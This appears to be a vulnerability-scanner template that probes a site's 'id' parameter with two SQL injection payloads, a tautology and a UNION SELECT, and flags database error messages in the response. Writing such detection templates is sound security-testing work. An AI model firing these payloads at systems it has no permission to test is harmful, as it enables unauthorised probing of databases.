id: sqli6-generic-06
name: 'SQLi generic probe in id'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via id'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - '` OR `1`=`1'
        - ''' UNION SELECT NULL,NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
